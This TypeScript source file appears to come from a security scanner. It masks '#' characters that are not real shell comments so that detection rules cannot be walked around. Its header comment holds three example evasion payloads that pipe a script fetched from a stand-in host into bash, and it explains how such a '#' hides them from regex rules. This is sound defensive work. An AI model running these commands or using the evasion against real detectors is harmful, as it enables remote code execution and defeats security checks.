/**
 * Which `#` characters are real shell comments?
 *
 * Many rules use `[^#\n]*` to mean "later on the same command": a `#` is meant to end
 * the command because the rest of the line is a comment. But in a shell `#` starts a
 * comment only at the START OF A WORD. Anywhere else it is an ordinary character, and
 * a rule that stops at it can be walked around with a payload the shell still runs:
 *
 *     curl https://evil.net/p.sh#x | bash       URL fragment: mid-word
 *     curl https://evil.net/p.sh\ #x | bash     escaped space: still one word
 *     curl "https://evil.net/p.sh #x" | bash    inside quotes
 *
 * maskLiteralHashes() rewrites every `#` that is not a comment into LITERAL_HASH, so
 * `[^#\n]*` runs straight through it. A `#` that is a comment is left alone and keeps
 * ending the span, as before.
 *
 * Why this is safe on hostile input
 * ---------------------------------
 * This is not a shell parser and does not try to be one: it does not track quotes,
 * `$(...)`, `${...}`, heredocs, or anything that spans lines. Instead it only ever
 * errs in the direction that reports MORE. A `#` keeps its comment role only when ALL
 * of these hold:
 *
 *  1. It starts a word: first on the line, or after an unescaped space or tab.
 *  2. It is not followed by `>` (the end of a PowerShell `<# ... #>` block comment,
 *     after which the command carries on).
 *  3. No quote, backtick or `}` appears later on the line.
 *
 * Rule 3 carries the security argument. For a `#` to be literal and still hide a
 * payload that runs, whatever makes it literal (a quote, a `${...}`, a string opened
 * on an earlier line) must CLOSE after the `#` and before the payload, on this same
 * line. That closing character is a quote, a backtick or a `}`. So whatever state the
 * shell was in when the line began, and whatever this scanner failed to model, such a
 * `#` always fails rule 3 and is masked. The cost of being wrong is a comment that
 * contains an apostrophe no longer ends the span: a possible extra finding, never a
 * missed one.
 *
 * Linear time: one forward pass and one backward pass, no regular expressions, so
 * there is nothing for a crafted line to backtrack on.
 */

/**
 * Stands in for a `#` that is not a comment. Never `#`, never whitespace and never a
 * word character, so it behaves exactly like the `#` it replaced everywhere except
 * inside `[^#\n]`, which is the point. Same length as `#`, so match offsets stay valid.
 */
export const LITERAL_HASH = "\u0001";

const HASH = 0x23;
const BACKSLASH = 0x5c;
const SPACE = 0x20;
const TAB = 0x09;
const GREATER_THAN = 0x3e;

/**
 * Does the rule use `#` as a "same command" barrier, i.e. a `[^#...]` class? Only those
 * rules match against the masked view. A rule that wants to SEE a `#` (RB-004 matches
 * Ruby's `#{...}` interpolation) must keep the raw text: masking would hide the very
 * character it looks for and silently disable it. Not "contains `#`": that is what
 * disabled RB-004 the first time round.
 */
export function usesHashBarrier(pattern: RegExp): boolean {
  return pattern.source.includes("[^#");
}

/** Index of the last quote, backtick or closing brace on the line, or -1. */
function lastCloser(line: string): number {
  for (let i = line.length - 1; i >= 0; i--) {
    const c = line.charCodeAt(i);
    if (c === 0x27 /* ' */ || c === 0x22 /* " */ || c === 0x60 /* ` */ || c === 0x7d /* } */) {
      return i;
    }
  }
  return -1;
}

function replaceAt(line: string, positions: readonly number[]): string {
  if (positions.length === 0) return line;
  const parts: string[] = [];
  let from = 0;
  for (const at of positions) {
    parts.push(line.slice(from, at), LITERAL_HASH);
    from = at + 1;
  }
  parts.push(line.slice(from));
  return parts.join("");
}

/**
 * `line` with every `#` that is not a comment replaced by LITERAL_HASH. The result
 * has the same length as `line`; a line without a `#` is returned as is.
 */
export function maskLiteralHashes(line: string): string {
  if (line.indexOf("#") === -1) return line;

  const closer = lastCloser(line);
  const literal: number[] = [];
  let escaped = false;
  let wordStart = true;

  for (let i = 0; i < line.length; i++) {
    const c = line.charCodeAt(i);
    if (escaped) {
      // The escaped character is part of the current word, even a space, and an
      // escaped `#` (`\#`) is a plain character, never a comment.
      escaped = false;
      wordStart = false;
      if (c === HASH) literal.push(i);
      continue;
    }
    if (c === BACKSLASH) {
      escaped = true;
      wordStart = false;
      continue;
    }
    if (c === HASH) {
      const startsComment =
        wordStart && closer < i && line.charCodeAt(i + 1) !== GREATER_THAN;
      if (startsComment) break; // the rest of the line is a comment: leave it untouched
      literal.push(i);
      wordStart = false;
      continue;
    }
    wordStart = c === SPACE || c === TAB;
  }

  return replaceAt(line, literal);
}
